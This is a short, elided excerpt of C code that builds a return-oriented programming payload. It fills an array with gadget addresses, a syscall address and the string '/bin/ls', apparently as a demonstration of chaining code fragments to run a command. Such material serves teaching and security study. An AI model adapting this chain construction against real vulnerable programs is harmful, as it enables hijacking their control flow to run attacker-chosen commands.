...
int main(int argc, char * argv[])
{
  ...
  payload[8] = (cst_int_t) &gadget4;
  payload[9] = (cst_int_t) &gadget4;
  payload[10] = (cst_int_t) &gadget5;
  payload[11] = (cst_int_t) &gadget6;
  payload[12] = (cst_int_t) &gadget7;
  payload[13] = (cst_int_t) &syscall;
  payload[14] = 0x00736c2f6e69622f;
  payload[15] = 0x0000000000000000;
